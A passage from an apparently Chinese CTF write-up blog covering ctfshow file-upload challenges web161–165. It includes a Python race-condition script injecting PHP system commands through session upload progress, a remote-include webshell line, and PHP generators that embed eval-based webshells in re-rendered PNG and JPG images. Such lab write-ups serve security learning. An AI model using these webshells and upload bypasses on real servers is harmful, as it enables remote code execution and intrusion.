src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225151417817.png" alt="image-20221225151417817"></p><p>还是一样的东西，这不过这里过滤了好多，试了下，就是把png头给过滤掉了。</p><p>这里用GIF图片头可以绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225151910771.png" alt="image-20221225151910771"></p><p>那么接下来就可以用.user.ini了。</p><p>上传.user.ini的时候也要加上GIF89a头</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225152324031.png" alt="image-20221225152324031"></p><p>然后就去和前面一样进行日志包含了。</p><p>然后进行rce就行了。</p><h2 id="web162"><a href="#web162" class="headerlink" title="web162"></a>web162</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225153759215.png" alt="image-20221225153759215"></p><p>这里经过测试不能用        <strong>.</strong></p><p>那么我们就可以用远程文件包含或者session条件竞争或者利用ascii构造代码(就是利用异或    或    非   与  等来构造)</p><p><strong>解法一</strong></p><p>条件竞争   </p><p><a href="https://blog.csdn.net/miuzzx/article/details/109537262?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161223805616780262526924%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161223805616780262526924&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-109537262.pc_search_result_no_baidu_js&amp;utm_term=ctfshow%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/miuzzx/article/details/109537262?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161223805616780262526924%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161223805616780262526924&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-109537262.pc_search_result_no_baidu_js&amp;utm_term=ctfshow%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0&amp;spm=1018.2226.3001.4187</a></p><p>yu师傅写的，可以来参考，我就不写了</p><p><strong>条件竞争代码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">session=requests.session()</span><br><span class="line">sess=<span class="string">&#x27;yu22x&#x27;</span></span><br><span class="line">url1=<span class="string">&quot;http://f275f432-9203-4050-99ad-a185d3b6f466.chall.ctf.show/&quot;</span></span><br><span class="line">url2=<span class="string">&quot;http://f275f432-9203-4050-99ad-a185d3b6f466.chall.ctf.show/upload&quot;</span></span><br><span class="line">data1=&#123;</span><br><span class="line"><span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php system(&quot;tac ../f*&quot;);?&gt;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">file=&#123;</span><br><span class="line"><span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;yu22x&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">cookies=&#123;</span><br><span class="line"><span class="string">&#x27;PHPSESSID&#x27;</span>: sess</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>():</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">r = session.post(url1,data=data1,files=file,cookies=cookies)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">r = session.get(url2)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line">threads = [threading.Thread(target=write),</span><br><span class="line">       threading.Thread(target=read)]</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">t.start()</span><br></pre></td></tr></table></figure><p><strong>解法二</strong></p><p>可以利用vps来写，但是这里我不懂搭，而且群主的视频里那个vps打不开了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://your-shell.com/1</span><br><span class="line">http://731540450/1</span><br></pre></td></tr></table></figure><p><img src="file:///C:\Users\sdbdb\AppData\Roaming\Tencent\QQTempSys\%W@GJ$ACOF(TYDYECOKVDYB.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=include&#x27;http://xxxxx/&#x27;?&gt;  ---&gt;这个网址里是一句话木马  &lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure><p>然后直接访问url/upload进行rce就能拿到flag了。</p><h2 id="web163"><a href="#web163" class="headerlink" title="web163"></a>web163</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225163327014.png" alt="image-20221225163327014"></p><p>这里就有两种解法，一种是条件竞争，一种就是利用vps</p><p>因为手头上没有vps那么这道题就空着了.</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225163510878.png" alt="image-20221225163510878"></p><p>如果有的话，直接直接上传，然后访问/upload就行了，</p><h2 id="web164"><a href="#web164" class="headerlink" title="web164"></a>web164</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225170512492.png" alt="image-20221225170512492"></p><p>这道题的考点是png图片的二次渲染，就是得在图片里包含我们的php代码，这里图片得用代码来渲染，直接图片和代码合成起来的图片码不行。</p><p>渲染代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;3.png&#x27;</span>); <span class="comment">#保存在本地的图片马</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在phpstudy的www里保存这段代码，并且把一张图片也保存下来，并且命名为自己想要命名的名字。</p><p>如何就去上传这个渲染后的图片码，并且进行抓包查看就行了。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225195009472.png" alt="image-20221225195009472"></p><p>成功写入代码并且执行了，然后进行rce就行了。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225195105069.png" alt="image-20221225195105069"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这道题是考察png图片的二次渲染，合成的图片码这里行不通。</span><br></pre></td></tr></table></figure><h2 id="web165"><a href="#web165" class="headerlink" title="web165"></a>web165</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225202653862.png" alt="image-20221225202653862"></p><p>这里就是利用的jpg二次渲染，但是这道题好像有点问题，好像得找到特殊的图片才能成功，所以这里教方法就行了。</p><p><strong>jpg渲染代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$miniPayload</span> = <span class="string">&#x27;&lt;?php echo 123;eval($_POST[0]);?&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;gd&#x27;</span>) || !<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">set_error_handler</span>(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">        <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">        <span class="variable">$dis</span> = <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$outStream</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>()) &amp;&amp; (<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>();</span><br><span class="line">            <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() - <span class="number">2</span>;</span><br><span class="line">            <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">skip</span>(<span class="variable">$size</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>();</span><br><span class="line">                <span class="variable">$outStreamTmp</span> = </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                    <span class="variable">$miniPayload</span> . </span><br><span class="line">                    <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) . </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">                <span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>() - <span class="number">2</span>;</span><br><span class="line">                    <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                    <span class="variable">$outStream</span> = </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                        <span class="variable">$miniPayload</span> . </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(</span><br><span class="line">                            <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) . </span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                    <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) || !<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;size - <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">eof</span>()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$byte</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">ord</span>(<span class="variable">$byte</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$short</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;order) &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="variable language_">$this</span>-&gt;binData||(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用法：  php exp.php a.jpg</span><br></pre></td></tr></table></figure><p>然后就会生成一个渲染后的jpg文件。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225203021359.png" alt="image-20221225203021359"></p><p><img 